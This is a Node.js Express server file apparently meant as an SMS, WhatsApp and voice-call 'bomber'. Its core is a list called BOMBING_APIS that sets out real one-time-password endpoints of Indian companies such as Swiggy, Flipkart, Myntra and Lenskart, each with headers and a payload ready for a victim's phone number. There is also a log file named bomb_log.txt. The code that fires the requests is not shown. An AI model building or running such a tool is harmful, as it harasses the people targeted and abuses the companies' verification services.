const express = require('express');
const cors = require('cors');
const axios = require('axios');
const helmet = require('helmet');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Security Middleware
app.use(helmet());
app.use(cors());
app.use(express.json());

// Configuration
const YOUR_API_KEYS = ["TOJI"];
const CACHE_TIME = 3600 * 1000;
const CACHE_FOLDER = '/tmp/cache';
const LOG_FILE = '/tmp/bomb_log.txt';

// Create cache folder if missing
if (!fs.existsSync(CACHE_FOLDER)) {
  fs.mkdirSync(CACHE_FOLDER, { recursive: true });
}

// All Bombing APIs
const BOMBING_APIS = [
  {
    "name": "Tata Capital Voice Call",
    "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "category": "call",
    "data": {"phone": null, "isOtpViaCallAtLogin": "true"}
  },
  {
    "name": "1MG Voice Call", 
    "url": "https://www.1mg.com/auth_api/v6/create_token",
    "method": "POST", 
    "headers": {"Content-Type": "application/json; charset=utf-8"},
    "category": "call",
    "data": {"number": null, "otp_on_call": true}
  },
  {
    "name": "Swiggy Call Verification",
    "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
    "method": "POST",
    "headers": {"Content-Type": "application/json; charset=utf-8"},
    "category": "call", 
    "data": {"mobile": null}
  },
  {
    "name": "Myntra Voice Call",
    "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "category": "call",
    "data": {"mobile": null}
  },
  {
    "name": "Flipkart Voice Call", 
    "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "category": "call",
    "data": {"mobile": null}
  },
  {
    "name": "KPN WhatsApp",
    "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
    "method": "POST",
    "headers": {
      "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
      "content-type": "application/json; charset=UTF-8"
    },
    "category": "whatsapp",
    "data": {
      "notification_channel": "WHATSAPP",
      "phone_number": {"country_code": "+91", "number": null}
    }
  },
  {
    "name": "Foxy WhatsApp",
    "url": "https://www.foxy.in/api/v2/users/send_otp", 
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "category": "whatsapp",
    "data": {"user": {"phone_number": null}, "via": "whatsapp"}
  },
  {
    "name": "Lenskart SMS",
    "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
    "method": "POST", 
    "headers": {"Content-Type": "application/json"},
    "category": "sms",
    "data": {"phoneCode": "+91", "telephone": null}
  },
  {
    "name": "NoBroker SMS",
    "url": "https://www.nobroker.in/api/v3/account/otp/send",
    "method": "POST",
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "category": "sms", 
    "data": "phone=null&countryCode=IN"
  },
  {
    "name": "PharmEasy SMS",
    "url": "https://pharmeasy.in/api/v2/auth/send-otp", 
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "category": "sms",
    "data": {"phone": null}
  },
  {
    "name": "Wakefit SMS",
    "url": "https://api.wakefit.co/api/consumer-sms-otp/",
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "category": "sms",
    "data": {"mobile": null}
  }
];

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
